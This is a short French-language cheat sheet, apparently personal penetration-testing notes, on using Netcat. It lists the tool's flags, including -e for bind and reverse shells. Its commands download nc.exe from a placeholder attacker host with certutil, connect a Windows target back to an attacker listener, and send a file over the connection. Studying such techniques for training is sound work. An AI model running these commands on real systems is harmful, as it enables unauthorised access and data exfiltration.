## Netcat
Utilisé pour le banner grabbing, port scanning, transfer de fichiers et reverse et bind shells.  

-u : UDP ports (par défaut en TCP)  
-l : listening ports  
-n : ne résoud pas les noms DNS, reste en IP  
-e : execute une commande spécifique (bind ou reverse shell)  
-v : verbose  

### 
`python -m SimpleHTTPServer 80` : crée un serveur HTTP en python sur la machine Kali.  
`certutil -urlcache -f http://IP_Attaquant/nc.exe nc.exe` : télécharger depuis la cible windows netcat sur le serveur web de la machine attaquante.  
`nc -lvnp 1234` : cré un port (1234) en écoute sur machine kali.  
`.\nc -nv ip_attaquant 1234` : depuis machine cible, exécute netcat pour se conneceter sur le port de la machine attaquante. (côté attaquant on est informé).  
Nous sommes ensuite connectés et il est possible d'envoyer du texte en console dans les 2 sens.  

Il est possible d'envoyer des fichiers :  
`nc.exe -nvlp 1234 > test.txt` : machine en écoute qui enverra ce qu'elle reçoit dans un ficher nommé test.txt  
`nc -nv 10.0.27.35 1234 < test.txt` : On se connecte avec l'autre machine, vers la machine en écoute en envoyant dans Netcat le ficher créé apppelé test.txt  







